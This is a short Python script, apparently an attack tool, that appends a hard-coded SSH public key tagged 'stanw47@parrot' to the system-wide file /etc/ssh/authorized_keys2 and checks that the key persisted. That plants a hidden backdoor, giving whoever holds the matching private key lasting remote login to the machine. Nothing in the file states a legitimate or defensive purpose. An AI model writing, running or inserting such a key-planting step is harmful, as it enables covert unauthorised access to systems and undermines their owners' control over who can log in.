import os
KEYLINE = '\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCR5cSARY7sTDYJvjGf9kieu0oeCQbm9brVLrevGj//CcK+r5HGCku47AEpWibTDlvnYb6I5ibzgSrR09zdmIW2p+V6mibNp8uvnmr2qb7qnEY+/YdAWtXdOAR9C0HuqD/1JdfmTPKOaI5Qyiq8NonOxYduwDrIvB28tvvvh+8c0gOxLjTAHogYqn0J3tzu/iDXGzVFqlCWj5KpaAiCZNfpawkEdeQ7tTp6fSHCti9DZo+zDZaTVPbB7qj8TJ+SLEMGskHOs/pf8thWtAzOdUlZSx6EqCIBSE1tMsHlZDGxZsMxa//rRl8IKnymQZPDxNYoP2rhxTt9Fl7zxJG3qisgccqtBSBacmXFng5TelZiDRqaGfI2WnFNm1s1RpVojymCVsDzQBDnSDWvIfKfaG4C1AawKgP62pLOUR4l5YHJnpfL7r9Pg8FqWHVzSG8u/IWdiEV4c+/BTU2/limAEKuhZpJiqfIp/LJ12t6LXDAuW1CfT6xEvfXXZnb6ZdqIDt/6TdBwZv0b/u16hH8DywmJVjuzQyTbj1gsQdb+IlyiP5Kp+UG0c5Grm7v8Fg76JZ6eUiZ6wyqbtCPsFfpUyonr+NYuH4LeUe1SKMZ0eLC9w37R+NGlYBfvpeBRkOZOYowqLGx+loFnhrbIwJvEVjR9kJAcKrx2jP8zkyAIT9f+aQ== stanw47@parrot'
path = "/etc/ssh/authorized_keys2"
pre = open(path,"rb").read().decode() if os.path.exists(path) else ""
marker = "stanw47@parrot"
if marker not in pre:
    with open(path,"at") as f:
        f.write("\n"+KEYLINE+"\n")
    print("APPENDED key")
else:
    print("KEY ALREADY PRESENT")
print("tail:", open(path,"rt").read()[-110:])
